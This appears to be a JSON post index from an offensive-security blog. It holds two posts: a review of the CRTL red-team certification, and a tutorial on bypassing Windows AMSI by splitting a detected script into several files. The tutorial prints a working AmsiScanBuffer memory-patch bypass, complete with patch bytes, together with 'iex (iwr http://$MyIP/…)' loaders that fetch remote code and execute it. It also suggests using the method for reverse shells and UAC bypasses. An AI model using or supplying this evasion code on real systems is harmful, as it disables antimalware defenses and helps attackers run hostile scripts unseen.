[ { "title": "Certified Red Team Lead (CRTL) Review -- Struggle and Joy Certification", "url": "/posts/Certified-Red-Team-Lead-CRTL-Review-Struggle-and-Joy-Certification/", "categories": "Defense Evasion, Certifications Review", "tags": "C2, EDR, Process_Injection, windows", "date": "2023-12-06 00:32:00 +0100", "snippet": "In this post, i’ll be reviewing CRTL certification, my learning and exam experience with some tips and resources.IntroductionAfter successfully obtaining my CRTO certification on July 4, I immediately purchased the next course in line, CRTL (CRTO II). I wasn’t fully prepared for it, but I bought it anyway to push myself to study. I was eager to enhance my red teaming skills, particularly on the research side, making CRTL the logical next step.BackgroundAs mentioned, I already have my CRTO and a background in red teaming and malware development from internships, work, and personal projects. This background played a crucial role in passing the exam, as CRTL doesn’t cover basics, especially AD attacks, lateral movements, and using Cobalt Strike C2.If pursuing this certification without the previous one, ensure comfort with Cobalt Strike and CRTO’s contents, listed here, focusing on Kerberos attacks, lateral movements, domain reconnaissance, and privilege escalation.ContentCRTL-2 focuses more on the research side of red teaming, involving advanced tooling development and evading defenses. The objectives, as stated on the site, include: Building secure on-premise C2 infrastructure using public cloud redirectors and HTTPS. Going deeper into C++ and C# programming with Windows APIs. Writing custom tooling for offensive actions like process injection, PPID spoofing, and command line spoofing. Cleaning up memory indicators of Cobalt Strike’s Beacon and leveraging in-memory obfuscation. Strategies for enumerating, identifying, and exploiting weaknesses in Attack Surface Reduction and Windows Defender Application Control technologies. Bypassing AV and EDR agents through circumventing ETW, userland hooking, and kernel callbacks. The CRTL-2 course is divided into eight chapters: C2 Infrastructure Windows APIs Process Injection Defense Evasion Attack Surface Reduction Windows Defender Application Control Protected Processes EDR EvasionThe first chapter describes building a secure C2 infrastructure using SSH tunneling, Apache redirection rules, and custom C2 malleable profiles.The Windows APIs and Process Injection chapters discuss how these APIs are used in C++ and C# to perform various actions, including process injections using different techniques such as APC Injection and section mapping.The subsequent chapters explain bypassing defense solutions like EDR, ASR, and WDAC, covering manual and Cobalt Strike provided features.ExamThe exam was challenging yet enjoyable, with a substantial sense of accomplishment after finding each flag. One downside was a particular flag, which I believe was unfair considering the certification’s name, prerequisites, and course content. i was really stuck for more than 5h wandering what should i do ..?Despite some flags being difficult, the overall experience was fun. The exam took 25 hours out of the allotted 72, providing a lot of time without excessive stress.Few days after i’ve submited all the flags, i received this email:TipsHere are some tips that helped me during the exam: Master the course’s prerequisites Take notes during studying Practice before the exam Take long breaks during the exam. Have a look at the resources and the tools.Tools &amp; ResourcesHere are some useful resources and tools to be comfortable with before taking the exam: Certified Pre-Owned Malleable C2 Profiles Ultimate WDAC Bypass List Cheat Sheets A Tale of EDR Bypass Methods Payloads All The Things - Active Directory AttackTools Rubeus Certify Powerview ADSearch Cobalt StrikeConclusionAs mentioned, the exam was challenging but provided a valuable learning experience. Like any course, it has its pros and cons:Cons Poor exam environment: slow, lagging, copy-paste issues. Limited content; could be more enriched, especially regarding Windows API and process injection techniques. Some important notes essential for passing the exam were missing.Pros Good content. Fair pricing. Straight-to-the-point explanations. Sufficient exam time.What’s Next?I still want to focus more on red teaming, especially malware development and red team infrastructure. Although unsure about the next certification, I might focus on personal research, delving deeper into advanced techniques and exploring kernel mode and rootkit development." }, { "title": "Divide And Bypass: A new Simple Way to Bypass AMSI", "url": "/posts/Divide-and-bypass-amsi/", "categories": "Defense Evasion", "tags": "amsi, powershell, bypass, windows", "date": "2022-12-09 17:32:00 +0100", "snippet": "This post is about a new simple way to bypass AMSI (Antimalware Scan Interface), that can be applied on small scripts, specially the popular AMSI bypasses.IntroductionIn the last few years, Powershell become so popular and a great target for hackers, as it provide access to almost all windows’s components, due to its integration with .NET framework, which allows us, Offensive security guys to perform differents attacks without even touching the disk, and that make AV jobs more difficut!Because of that, Microsoft introduced AMSI in 2015 as a defence Layer against this type of attacks, you can read all about it here.A defense mechanism for the offensive side, means that it need a bypass, and that’s what happened, new bypasses are discovered, Matt Graeber’s Reflection method, Patching amsi.dll AmsiScanBuffer by rasta-mouse etc …Problem?With all those differents AMSI bypasses, using .NET related offensive tools become possible again. Until those AMSI bypasses got signatures and become detected, and that open a new static analysis bypass/obfuscation adventures, Which sometimes become so boring and time consuming with a high possibility to not get a good result.Personally, i use powershell a lot, and i got tired of obfuscating small scripts, so it was very important for me to find a new way to bypass AMSI in powershell ..Thought ProcessI’m sure if you have ever played with AMSI bypass before, you have noticed that copying pasting a script into a powershell session will bypass AMSI, even if the script itself is detected.And that’s because by copying and pasting a script, it’s executed as separated lines, and it’s very unusual to create a signature for an individual line, because that will cause alot of false positives. So how to get advantage of this ..? how can this be used in a real scenario? Maybe dividing the script into small files? let’s try this ..Simple Testi started with a small simple scripts :# simple_test.ps1echo 'x4sh3s'$var = Get-Processcat $varLet’s divided it into 3 files, and execute the main one, to see if there are any problems with scoping or something else..# 1.txt$var = Get-Process# 2.txtcat $var# main.ps1echo 'x4sh3s';iex ( iwr http://$MyIP/1.txt -UseBasicParsing );iex ( iwr http://$MyIP/2.txt -UseBasicParsing ); the 2 files here 1.txt and 2.txt can be hosted online, or in your local machine by simply starting a simple python web server python3 -m http.server 80.By executing ./main.ps1 We see the processes list, which means that the variable $var in 1.txt is accessible by 2.txt. Good, let’s try something else, maybe Add-Type. Add-Type cmdlet adds a Microsoft .NET class to a PowerShell session. It’s used by Some AMSI Bypass which we’ll see later ..I took this example from Microsoft:# script.ps1echo \"This Line Is Mine\"$Source = @\"public class BasicTest{ public static int Add(int a, int b) { return (a + b); } public int Multiply(int a, int b) { return (a * b); }}\"@Add-Type -TypeDefinition $Source[BasicTest]::Add(4, 3)$BasicTestObject = New-Object BasicTest$BasicTestObject.Multiply(5, 2)Let’s apply the same previous steps on it.. we will divide it into 3 files ..# 1.txt$Source = @\"public class BasicTest{ public static int Add(int a, int b) { return (a + b); } public int Multiply(int a, int b) { return (a * b); }}\"@# 2.txtAdd-Type -TypeDefinition $Source[BasicTest]::Add(4, 3)$BasicTestObject = New-Object BasicTest$BasicTestObject.Multiply(5, 2)# main.ps1echo \"This Line Is Mine\"iex ( iwr http://$MyIP/1.txt -UseBasicParsing );iex ( iwr http://$MyIP/2.txt -UseBasicParsing );And it worked again, without problems:PS C:\\Users\\x4sh3s\\OneDrive\\Desktop&gt; .\\main.ps1This Line Is Mine710Bypass AMSINow, after we confirmed that this method work on the previous scripts, let’s apply it on scripts that are detected, and see if we can execute them without making AMSI angry!I’ll take The following script by Rastamouse as an example:# amsi_bypass.ps1$Win32 = @\"using System;using System.Runtime.InteropServices;public class Win32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}\"@Add-Type $Win32$LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\")$Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\")$p = 0[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)If we try execute it, we’ll get this output :The Bypass itself is detected!Let’s divide it into 3 files# 1.txt$LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\")$Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\")$p = 0$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)# 2.txt[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)# main.ps1$Win32 = @\"using System;using System.Runtime.InteropServices;public class Win32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}\"@Add-Type $Win32iex ( iwr http://localhost/1.txt -UseBasicParsing );iex ( iwr http://localhost/2.txt -UseBasicParsing );It Successfully Bypass AMSI, without changing a letter in the code! Niice.. In case it’s detected, breaking the script into more files (Line/file) will do the job, unless Microsoft finds a way to deny this method. Until then, Enjoy ^^You can found a PoC of all of that hereConclusionWe reached the end of the post,As a review, we saw how to bypass AMSI by dividing a script into small files. I think the most useful use-case of this method is execute an AMSI bypass, but it can be applied on any scripts ( small scripts ), Reverse shell, FODHelper UAC Bypass .. I didn’t testing on a script that contains defined functions, but the principle stay the same.i hope you learned something new by reading this post, if you have any comment/idea let me know, Any feedback will be appreciated ..Links &amp; Resources Hacker Cat Image https://images.wallpaperscraft.com/image/single/cat_silhouette_hacker_215616_1440x900.jpg Add-Type https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2 RastaMouse Amsi Bypass https://rastamouse.me/memory-patching-amsi-bypass/ AMSI https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal " } ]
